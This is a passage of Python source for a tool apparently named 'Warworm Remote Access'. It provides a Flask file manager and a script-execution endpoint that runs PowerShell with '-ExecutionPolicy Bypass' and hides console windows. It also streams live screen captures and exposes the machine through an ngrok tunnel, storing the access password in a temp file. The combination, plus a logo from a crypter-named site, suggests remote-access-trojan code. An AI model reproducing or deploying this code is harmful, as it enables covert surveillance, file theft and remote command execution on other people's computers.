    except Exception as e: 
        return jsonify({'error': 'Failed to create directory'}), 500


@fm_bp.route('/api/read')
@require_auth
@validate_filepath
def fm_read():
    """Read file content for editing"""
    path = request.args.get('path', '')
    try:
        target = Path(path).resolve()
        if not target.exists() or not target.is_file():
            return jsonify({'error': 'File not found'}), 404
        
        # Size limit for editing (10MB)
        if target.stat().st_size > 10 * 1024 * 1024:
            return jsonify({'error': 'File too large to edit (>10MB)'}), 413
        
        # Try to detect if binary
        with open(target, 'rb') as f:
            chunk = f.read(1024)
            if b'\x00' in chunk:
                return jsonify({'error': 'Binary files cannot be edited'}), 400
        
        # Read as text
        with open(target, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        return jsonify({
            'success': True, 
            'content': content,
            'name': target.name,
            'size': target.stat().st_size
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@fm_bp.route('/api/save', methods=['POST'])
@require_auth
@validate_filepath
def fm_save():
    """Save edited file content"""
    try:
        data = request.get_json()
        path = data.get('path', '')
        content = data.get('content', '')
        
        target = Path(path).resolve()
        if not target.exists() or not target.is_file():
            return jsonify({'error': 'File not found'}), 404
        
        # Backup original
        backup_path = str(target) + '.backup'
        shutil.copy2(str(target), backup_path)
        
        # Write new content
        with open(target, 'w', encoding='utf-8') as f:
            f.write(content)
        
        # Remove backup on success
        if os.path.exists(backup_path):
            os.remove(backup_path)
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@fm_bp.route('/api/preview')
@require_auth
@validate_filepath
def fm_preview():
    """Preview file (images, text, pdf)"""
    path = request.args.get('path', '')
    try:
        target = Path(path).resolve()
        if not target.exists() or not target.is_file():
            abort(404)
        
        mime_types = {
            '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png',
            '.gif': 'image/gif', '.bmp': 'image/bmp', '.webp': 'image/webp',
            '.txt': 'text/plain', '.py': 'text/plain', '.js': 'text/plain',
            '.html': 'text/html', '.css': 'text/css', '.json': 'application/json',
            '.pdf': 'application/pdf', '.mp4': 'video/mp4', '.webm': 'video/webm'
        }
        
        ext = target.suffix.lower()
        mimetype = mime_types.get(ext, 'application/octet-stream')
        
        # For text files, return content as JSON
        if mimetype == 'text/plain' or ext in ['.py', '.js', '.html', '.css', '.json', '.txt']:
            with open(target, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            return jsonify({
                'type': 'text',
                'content': content,
                'mime': mimetype
            })
        
        # For images and other files, send file
        return send_file(str(target), mimetype=mimetype)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    

@fm_bp.route('/api/execute', methods=['POST'])
@require_auth
@validate_filepath
def fm_execute():
    """Execute script files with safety restrictions"""
    try:
        data = request.get_json()
        path = data.get('path', '')
        target = Path(path).resolve()
        
        if not target.exists() or not target.is_file():
            return jsonify({'error': 'File not found'}), 404
        
        # Security: Only allow specific script extensions
        allowed_exts = {'.py', '.bat', '.cmd', '.sh', '.ps1', '.vbs', '.js'}
        ext = target.suffix.lower()
        
        if ext not in allowed_exts:
            return jsonify({'error': f'Execution not allowed for {ext} files. Allowed: {", ".join(allowed_exts)}'}), 403
        
        # Security: Check file size (max 5MB)
        if target.stat().st_size > 5 * 1024 * 1024:
            return jsonify({'error': 'File too large to execute (>5MB)'}), 413
        
        # Execute based on file type
        import subprocess
        import tempfile
        
        stdout_file = tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt')
        stderr_file = tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt')
        
        try:
            if ext == '.py':
                cmd = [sys.executable, str(target)]
            elif ext in ['.bat', '.cmd']:
                cmd = ['cmd.exe', '/c', str(target)]
            elif ext == '.ps1':
                cmd = ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', str(target)]
            elif ext == '.sh':
                cmd = ['bash', str(target)]
            elif ext == '.vbs':
                cmd = ['cscript.exe', '//NoLogo', str(target)]
            elif ext == '.js':
                cmd = ['cscript.exe', '//NoLogo', str(target)]
            else:
                return jsonify({'error': 'Unsupported file type'}), 400
            
            # Run with timeout and capture output
            process = subprocess.Popen(
                cmd,
                stdout=stdout_file,
                stderr=stderr_file,
                cwd=str(target.parent),
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            )
            
            try:
                process.wait(timeout=30)  # 30 second timeout
            except subprocess.TimeoutExpired:
                process.kill()
                return jsonify({'error': 'Execution timeout (30s exceeded)', 'partial': True}), 408
            
            stdout_file.flush()
            stderr_file.flush()
            
            # Read outputs
            with open(stdout_file.name, 'r', errors='ignore') as f:
                stdout = f.read()
            with open(stderr_file.name, 'r', errors='ignore') as f:
                stderr = f.read()
            
            return jsonify({
                'success': True,
                'returncode': process.returncode,
                'stdout': stdout,
                'stderr': stderr,
                'command': ' '.join(cmd)
            })
            
        finally:
            try:
                os.unlink(stdout_file.name)
                os.unlink(stderr_file.name)
            except:
                pass
                
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@fm_bp.route('/api/open')
@require_auth
@validate_filepath
def fm_open():
    """Open file - returns content for text, redirects to download for binary"""
    path = request.args.get('path', '')
    try:
        target = Path(path).resolve()
        if not target.exists() or not target.is_file():
            abort(404)
        
        # Text files - return content
        text_exts = {'.txt', '.py', '.js', '.html', '.css', '.json', '.xml', '.md', '.log', '.csv', '.ini', '.cfg', '.bat', '.sh', '.ps1', '.vbs'}
        if target.suffix.lower() in text_exts:
            with open(target, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            return jsonify({
                'type': 'text',
                'content': content,
                'name': target.name
            })
        
        # Images - return base64 for preview
        image_exts = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}
        if target.suffix.lower() in image_exts:
            import base64
            with open(target, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            return jsonify({
                'type': 'image',
                'data': data,
                'mime': 'image/' + target.suffix.lower().replace('.', '').replace('jpg', 'jpeg'),
                'name': target.name
            })
        
        # Everything else - trigger download
        return jsonify({
            'type': 'download',
            'url': 'api/download?path=' + request.args.get('path', ''),
            'name': target.name
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@fm_bp.route('/api/upload', methods=['POST'])
@require_auth
@validate_filepath
def fm_upload():
    """Upload files to specific directory"""
    if 'files' not in request.files: 
        return jsonify({'error': 'No files provided'}), 400
    
    # Get target path from form data
    path = request.form.get('path', str(Path.home()))
    target = Path(path).resolve()
    
    # Ensure target exists and is a directory
    if not target.exists():
        try:
            target.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            return jsonify({'error': f'Cannot create directory: {str(e)}'}), 400
    
    if not target.is_dir(): 
        return jsonify({'error': 'Invalid path - not a directory'}), 400
    
    uploaded = []
    failed = []
    
    for file in request.files.getlist('files'):
        if file.filename:
            # Secure the filename
            safe_name = secure_filename(file.filename)
            if not safe_name or safe_name.startswith('.') or '..' in safe_name:
                failed.append(f"{file.filename} (invalid name)")
                continue
            
            try:
                file_path = target / safe_name
                
                # Check for directory traversal
                file_path.resolve().relative_to(target.resolve())
                
                # Save file
                file.save(str(file_path))
                uploaded.append(safe_name)
                
            except Exception as e:
                failed.append(f"{file.filename} ({str(e)})")
    
    if failed and not uploaded:
        return jsonify({'error': 'All uploads failed', 'details': failed}), 500
    
    return jsonify({
        'success': True, 
        'files': uploaded,
        'count': len(uploaded),
        'failed': failed,
        'target_directory': str(target)
    })
# ============================================================================
# SCREEN CAPTURE FUNCTIONS
# ============================================================================
def capture_screen():
    global screen_w, screen_h
    try:
        img = ImageGrab.grab()
        if img: 
            screen_w, screen_h = img.size
            return img.convert('RGB')
    except Exception as e: 
        print(f"Capture error: {e}")
    return None

def encoder_thread():
    global current_frame, running
    while running:
        try:
            target_interval = 1.0 / rd_settings.get('fps', 30)
            img = capture_screen()
            if img:
                buffer = io.BytesIO()
                img.save(buffer, format='JPEG', quality=rd_settings.get('quality', 85), optimize=True)
                with frame_lock: 
                    current_frame = buffer.getvalue()
            time.sleep(target_interval)
        except Exception as e: 
            print(f"Encoder error: {e}")
            time.sleep(0.5)

# ============================================================================
# MAIN APP & SERVER
# ============================================================================
def create_app(config):
    app = Flask(__name__)
    
    app.secret_key = config.get('secret_key') or secrets.token_hex(32)
    app.config['RA_PASSWORD'] = config.get('remote_access_password') or ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
    app.config['SESSION_TYPE'] = 'filesystem'
    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
    
    app.register_blueprint(rd_bp)
    app.register_blueprint(fm_bp)
    
    @app.after_request
    def after_request(response):
        return add_security_headers(response)
    
    @app.route('/')
    def index():
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Warworm Remote Access</title>
    <style>
        body { background: #0a0a0f; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        h1 { color: #00f0ff; margin-bottom: 2rem; font-size: 2.5rem; }
        .links { display: flex; gap: 2rem; justify-content: center; flex-wrap: wrap; }
        .link-box { 
            background: rgba(30,30,40,0.95); 
            border: 1px solid rgba(255,255,255,0.1); 
            border-radius: 20px; 
            padding: 3rem; 
            width: 300px; 
            cursor: pointer; 
            transition: all 0.3s; 
            text-decoration: none; 
            color: #fff; 
            display: block; 
        }
        .link-box:hover { 
            border-color: #00f0ff; 
            transform: translateY(-5px); 
            box-shadow: 0 10px 30px rgba(0,240,255,0.2); 
        }
        .icon { font-size: 4rem; margin-bottom: 1rem; }
        .title { font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem; }
        .desc { color: #888; font-size: 0.9rem; }
        .badge { 
            display: inline-block; 
            margin-top: 1rem; 
            padding: 0.5rem 1rem; 
            background: rgba(0,255,136,0.1); 
            border-radius: 8px; 
            font-size: 0.85rem; 
            color: #00ff88; 
            border: 1px solid rgba(0,255,136,0.3); 
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 2rem;">
            <img src="https://drcrypter.net/data/assets/logo/logo1.png" alt="Logo" style="height: 42px; width: auto; border-radius: 8px;">
            Warworm Remote Access
        </h1>
        <div class="links">
            <a href="/rd/" class="link-box">
                <div class="icon">🖥️</div>
                <div class="title">Remote Desktop</div>
                <div class="desc">Real-time screen streaming & control</div>
                <div class="badge">Protected</div>
            </a>
            <a href="/fm/" class="link-box">
                <div class="icon">📁</div>
                <div class="title">File Manager</div>
                <div class="desc">Browse, upload & download files</div>
                <div class="badge">Protected</div>
            </a>
        </div>
        <p style="margin-top: 2rem; color: #666; font-size: 0.9rem;">Password Protection</p>
    </div>
</body>
</html>'''
    return app

class RemoteAccessServer:
    def __init__(self, config):
        self.config = config
        self.password = config.get('remote_access_password') or ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
        self.ngrok_token = config.get('ngrok_token', '')
        self.port = config.get('rmm_port', 5005)  # CHANGED: was remote_access_port, default 5000
        self.host = "127.0.0.1"
        self._ngrok_process = None
        self.app = create_app(config)
        
    def save_status(self, public_url):
        try:
            status_file = os.path.join(tempfile.gettempdir(), 'warworm_status.json')
            data = {
                'rmm': {  
                    'url': public_url, 
                    'port': self.port,
                    'remote_desktop': f"{public_url}/rd/" if public_url else None,
                    'file_manager': f"{public_url}/fm/" if public_url else None,
                    'password': self.password, 
                    'timestamp': datetime.now().isoformat()
                }
            }
            with open(status_file, 'w') as f: 
                json.dump(data, f, indent=2)
            print(f"[REMOTE ACCESS] Status saved")
        except Exception as e: 
            print(f"[REMOTE ACCESS] Status save error: {e}")
    
    def start_ngrok(self):
        if not self.ngrok_token: 
            return
        self._ngrok_process, public_url = run_ngrok_subprocess(self.ngrok_token, self.port)
        if public_url:
            self.save_status(public_url)
            print(f"\n{'='*60}")
            print(f"[REMOTE ACCESS] NGROK URL: {public_url}")
            print(f"[REMOTE ACCESS] RD: {public_url}/rd/")
            print(f"[REMOTE ACCESS] FM: {public_url}/fm/")
            print(f"[REMOTE ACCESS] Password: {self.password}")
            print(f"{'='*60}\n")
        else:
            print("[REMOTE ACCESS] Ngrok failed to start")
    
    def run(self):
        global running
        if self.config.get('features', {}).get('remote_desktop', False):
            running = True
            threading.Thread(target=encoder_thread, daemon=True).start()
            print("[REMOTE ACCESS] Screen capture started")
        
        if self.ngrok_token:
            ngrok_thread = threading.Thread(target=self.start_ngrok, daemon=True)
            ngrok_thread.start()
            time.sleep(3)
        
        print(f"[REMOTE ACCESS] Server running on http://{self.host}:{self.port}")
        print(f"  Password: {self.password}")
        from werkzeug.serving import run_simple
        run_simple(self.host, self.port, self.app, threaded=True, use_reloader=False)

def start_remote_access(config):
    server = RemoteAccessServer(config)
    server.run()

# ============================================================================
# STANDALONE Execute TEST-LAB + Debug Modules
# ============================================================================
if __name__ == '__main__':
    print("="*70)
    print("WARWORM REMOTE ACCESS - SECURE MODE")
    print("="*70)
    
    TEST_NGROK_TOKEN = ""
    TEST_PORT = 5000
    TEST_PASSWORD = ""
    
    ngrok_token = TEST_NGROK_TOKEN
    if not ngrok_token:
        ngrok_token = input("[TEST] Enter Ngrok Auth Token (press Enter to skip ngrok): ").strip()
    
    if not TEST_PASSWORD:
        TEST_PASSWORD = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
    
    test_config = {
        "remote_access_password": TEST_PASSWORD,
        "remote_access_port": TEST_PORT,
        "ngrok_token": ngrok_token,
        "features": {
            "remote_desktop": True,
            "file_manager": True
        }
    }
    
    print(f"\n[TEST] Configuration:")
    print(f"       Port: {TEST_PORT}")
    print(f"       Password: {TEST_PASSWORD}")
    print(f"       Ngrok Token: {'Yes' if ngrok_token else 'No'}")
    print("="*70)
    
    ngrok_process = None
    
    def cleanup(signum=None, frame=None):
        print("\n[TEST] Cleaning up...")
        global ngrok_process
        if ngrok_process:
            try:
                ngrok_process.terminate()
                ngrok_process.wait(timeout=2)
                print("[TEST] Ngrok stopped")
            except:
                try:
                    ngrok_process.kill()
                except:
                    pass
        kill_existing_ngrok()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    
    if ngrok_token:
        print("[TEST] Checking ngrok...")
        exe_path = ensure_ngrok()
        if not exe_path:
            print("[TEST] ERROR: Failed to download ngrok")
            sys.exit(1)
        print(f"[TEST] Ngrok ready: {exe_path}")
        
        print("[TEST] Configuring ngrok token...")
        try:
            config_cmd = [exe_path, "config", "add-authtoken", ngrok_token]
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            
            result = subprocess.run(
                config_cmd,
                capture_output=True,
                text=True,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
                timeout=10
            )
            if result.returncode == 0:
                print("[TEST] Token configured successfully")
        except Exception as e:
            print(f"[TEST] Token config error: {e}")
        
        kill_existing_ngrok()
        time.sleep(1)
        
        print(f"[TEST] Starting ngrok http {TEST_PORT}...")
        cmd = [exe_path, "http", str(TEST_PORT), "--region", "us"]
        
        startupinfo = None
        if sys.platform == 'win32':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
        
        ngrok_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
            cwd=os.path.dirname(exe_path),
            text=True,
            bufsize=1
        )
        
        print("[TEST] Waiting for ngrok tunnel...")
        public_url = None
        for i in range(30):
            time.sleep(1)
            public_url = get_ngrok_url()
            if public_url:
                break
            if ngrok_process.poll() is not None:
                print("[TEST] ERROR: Ngrok process died")
                break
        
        if public_url:
            print("\n" + "="*70)
            print("🌐 NGROK TUNNEL ESTABLISHED")
            print("="*70)
            print(f"Public URL: {public_url}")
            print(f"Remote Desktop: {public_url}/rd/")
            print(f"File Manager: {public_url}/fm/")
            print(f"Password: {TEST_PASSWORD}")
            print("="*70 + "\n")
            
            try:
                status_file = os.path.join(tempfile.gettempdir(), 'warworm_status.json')
                with open(status_file, 'w') as f:
                    json.dump({
                        'rmm': {
                            'url': public_url,
                            'port': TEST_PORT,
                            'remote_desktop': f"{public_url}/rd/",
                            'file_manager': f"{public_url}/fm/",
                            'password': TEST_PASSWORD,
                            'timestamp': datetime.now().isoformat()
                        }
                    }, f, indent=2)
                print(f"[TEST] Status saved to: {status_file}")
            except Exception as e:
                print(f"[TEST] Status save error: {e}")
        else:
            print("[TEST] WARNING: Ngrok URL not available - running local only")
    
    running = True
    threading.Thread(target=encoder_thread, daemon=True).start()
    print("[TEST] Screen capture started")
    
    app = create_app(test_config)
    
    print("\n" + "="*70)
    print("🚀 SECURE SERVER STARTED")
    print("="*70)
    print(f"Local URL: http://127.0.0.1:{TEST_PORT}/")
    print(f"Remote Desktop: http://127.0.0.1:{TEST_PORT}/rd/")
    print(f"File Manager: http://127.0.0.1:{TEST_PORT}/fm/")
    print(f"Password: {TEST_PASSWORD}")
    print("="*70)
    print("Press CTRL+C to stop")
    print("="*70 + "\n")
    
    try:
        from werkzeug.serving import run_simple
        run_simple('127.0.0.1', TEST_PORT, app, threaded=True, use_reloader=False)
    except KeyboardInterrupt:
        cleanup()